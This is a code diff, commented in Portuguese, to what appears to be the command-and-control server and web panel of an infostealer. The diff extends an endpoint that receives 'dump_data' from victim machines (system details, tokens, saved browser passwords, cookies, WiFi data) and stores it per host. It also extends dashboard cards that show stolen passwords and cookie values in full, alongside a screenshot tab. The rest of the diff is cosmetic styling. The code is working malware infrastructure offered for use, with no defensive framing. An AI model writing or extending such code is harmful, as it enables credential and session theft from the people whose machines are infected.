@@ -164,13 +164,58 @@ def receive_full_report():
     try:
         data = request.json
         endpoint_id = data.get('endpoint_id', 'unknown')
+        dump_data = data.get('dump_data', {})
+        
+        # Extrai dados do dump
+        system_info = dump_data.get('system', {})
+        tokens = dump_data.get('tokens', [])
+        passwords = dump_data.get('passwords', [])
+        cookies = dump_data.get('cookies', [])
+        wifi = dump_data.get('wifi', [])
+        
+        # Armazena nos endpoints existentes
+        if endpoint_id not in endpoints:
+            endpoints[endpoint_id] = {
+                'id': endpoint_id,
+                'hostname': system_info.get('hostname', 'Unknown'),
+                'user': system_info.get('user', 'Unknown'),
+                'ip_address': system_info.get('ip_address', 'Unknown'),
+                'external_ip': system_info.get('external_ip', 'Unknown'),
+                'platform': system_info.get('platform', 'Unknown'),
+                'ram': system_info.get('ram', 'Unknown'),
+                'timestamp': datetime.now().isoformat(),
+                'status': 'online',
+                'last_seen': datetime.now().strftime('%H:%M:%S')
+            }
+        
+        # Armazena dados específicos
+        endpoint_tokens[endpoint_id] = {
+            'tokens': tokens,
+            'timestamp': datetime.now().isoformat()
+        }
+        
+        endpoint_passwords[endpoint_id] = {
+            'passwords': passwords,
+            'timestamp': datetime.now().isoformat()
+        }
+        
+        endpoint_cookies[endpoint_id] = {
+            'cookies': cookies,
+            'timestamp': datetime.now().isoformat()
+        }
         
         full_reports[endpoint_id] = {
-            'metadata': data,
+            'metadata': dump_data,
             'received_at': datetime.now().isoformat()
         }
         
-        print(f"📋 Relatório completo recebido de {endpoint_id}")
+        print(f"📋 Relatório completo de {endpoint_id}:")
+        print(f"   - Tokens: {len(tokens)}")
+        print(f"   - Senhas: {len(passwords)}")
+        print(f"   - Cookies: {len(cookies)}")
+        print(f"   - WiFi: {len(wifi)}")
+        print(f"   - Status AES: {dump_data.get('aes_key_status', 'N/A')}")
+        
         return jsonify({'status': 'success', 'message': 'Full report received'})
     except Exception as e:
         return jsonify({'status': 'error', 'message': str(e)}), 500
@@ -326,23 +371,31 @@ HTML_TEMPLATE = """<!DOCTYPE html>
             min-height: 100vh;
             position: relative;
         }
-        .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
-        .header { text-align: center; margin-bottom: 40px; }
+        .container { max-width: 1400px; margin: 0 auto; padding: 10px; }
+        .header { text-align: center; margin-bottom: 20px; }
         .header h1 { 
-            font-size: 3em; 
-            margin-bottom: 10px; 
-            background: linear-gradient(135deg, #7c3aed 0%, #a855f7 100%);
+            font-size: 3.5em; 
+            margin-bottom: 5px; 
+            background: linear-gradient(135deg, #7c3aed 0%, #a855f7 50%, #7c3aed 100%);
+            background-size: 200% 200%;
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             font-weight: 700;
+            text-shadow: 0 0 30px rgba(124, 58, 237, 0.5);
+            animation: shine 3s ease-in-out infinite;
         }
-        .header p { color: #9ca3af; font-size: 1.1rem; }
+        @keyframes shine {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        .header p { color: #9ca3af; font-size: 1.2rem; margin-bottom: 10px; }
         
         .stats-grid { 
             display: grid; 
             grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); 
             gap: 25px; 
-            margin-bottom: 50px;
+            margin-bottom: 30px;
         }
         .stat-card { 
             background: linear-gradient(135deg, rgba(124, 58, 237, 0.1) 0%, rgba(168, 85, 247, 0.1) 100%);
@@ -367,7 +420,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
         
         .tabs-container { 
             display: flex; 
-            margin-bottom: 30px;
+            margin-bottom: 20px;
             background: rgba(17, 17, 27, 0.6);
             border-radius: 12px;
             padding: 5px;
@@ -637,14 +690,14 @@ HTML_TEMPLATE = """<!DOCTYPE html>
         </div>
 
         <div id="endpoints" class="tab-content active">
-            <h2 style="color: #f3f4f6; margin-bottom: 24px; padding-left: 12px; border-left: 3px solid #a855f7;">Endpoints Monitorados</h2>
+            <h2 style="color: #f3f4f6; margin-bottom: 20px; padding-left: 12px; border-left: 3px solid #a855f7;">Endpoints Monitorados</h2>
             <div class="cards-grid" id="endpointsList">
                 <div style="color: #6b7280; text-align: center; padding: 40px;">Carregando...</div>
             </div>
         </div>
 
         <div id="screenshot" class="tab-content">
-            <h2 style="color: #f3f4f6; margin-bottom: 24px; padding-left: 12px; border-left: 3px solid #a855f7;">Screenshot Manual</h2>
+            <h2 style="color: #f3f4f6; margin-bottom: 20px; padding-left: 12px; border-left: 3px solid #a855f7;">Screenshot Manual</h2>
             <div style="background: rgba(17, 17, 27, 0.6); border-radius: 16px; padding: 24px;">
                 <select id="endpointSelect" style="width: 100%; max-width: 400px; padding: 14px; background: rgba(10, 10, 15, 0.8); border: 1px solid rgba(124, 58, 237, 0.3); border-radius: 12px; color: #e0e0e0; font-size: 0.95rem; margin-bottom: 20px;" onchange="selectEndpoint()">
                     <option value="">Selecione um endpoint...</option>
@@ -798,8 +851,16 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                         ${passwords.length > 0 ? `
                             <div class="data-preview">
                                 <strong style="color: #a855f7;">🔒 Senhas (${passwords.length}):</strong>
-                                ${passwords.slice(0, 3).map(p => `<div class="data-preview-item">${p.url || 'N/A'}: ${p.username || 'N/A'}</div>`).join('')}
+                                ${passwords.slice(0, 3).map(p => `<div class="data-preview-item">${p.service || 'Web'}: ${p.username || 'N/A'}</div>`).join('')}
                                 ${passwords.length > 3 ? `<div class="data-preview-item">... e mais ${passwords.length - 3}</div>` : ''}
+                            </div>
+                        ` : ''}
+                        
+                        ${cookies.length > 0 ? `
+                            <div class="data-preview">
+                                <strong style="color: #a855f7;">🍪 Cookies (${cookies.length}):</strong>
+                                ${cookies.slice(0, 3).map(c => `<div class="data-preview-item">${c.service || c.host || 'N/A'}: ${c.name}</div>`).join('')}
+                                ${cookies.length > 3 ? `<div class="data-preview-item">... e mais ${cookies.length - 3}</div>` : ''}
                             </div>
                         ` : ''}
                         
@@ -858,12 +919,12 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                 
                 <div class="data-section">
                     <h3>🔒 Senhas (${passwords.length})</h3>
-                    ${passwords.length > 0 ? passwords.map(p => `<div class="password-card"><strong>URL:</strong> ${p.url || 'N/A'}<br><strong>Usuário:</strong> ${p.username || 'N/A'}<br><strong>Senha:</strong> ${p.password || 'N/A'}</div>`).join('') : '<div class="empty-state">Nenhuma senha encontrada</div>'}
+                    ${passwords.length > 0 ? passwords.map(p => `<div class="password-card"><strong>Serviço:</strong> ${p.service || 'Web'}<br><strong>URL:</strong> ${p.url || 'N/A'}<br><strong>Usuário:</strong> ${p.username || 'N/A'}<br><strong>Senha:</strong> ${p.password || 'N/A'}<br><strong>Navegador:</strong> ${p.browser || 'N/A'}</div>`).join('') : '<div class="empty-state">Nenhuma senha encontrada</div>'}
                 </div>
                 
                 <div class="data-section">
                     <h3>🍪 Cookies (${cookies.length})</h3>
-                    ${cookies.length > 0 ? cookies.map(c => `<div class="cookie-card"><strong>Host:</strong> ${c.host || 'N/A'}<br><strong>Nome:</strong> ${c.name || 'N/A'}<br><strong>Valor:</strong> ${c.value ? c.value.substring(0, 100) + (c.value.length > 100 ? '...' : '') : 'N/A'}</div>`).join('') : '<div class="empty-state">Nenhum cookie encontrado</div>'}
+                    ${cookies.length > 0 ? cookies.map(c => `<div class="cookie-card"><strong>Serviço:</strong> ${c.service || 'N/A'}<br><strong>Host:</strong> ${c.host || 'N/A'}<br><strong>Nome:</strong> ${c.name || 'N/A'}<br><strong>Valor:</strong> ${c.value ? c.value.substring(0, 100) + (c.value.length > 100 ? '...' : '') : 'N/A'}<br><strong>Navegador:</strong> ${c.browser || 'N/A'}</div>`).join('') : '<div class="empty-state">Nenhum cookie encontrado</div>'}
                 </div>
                 
                 <div class="data-section">
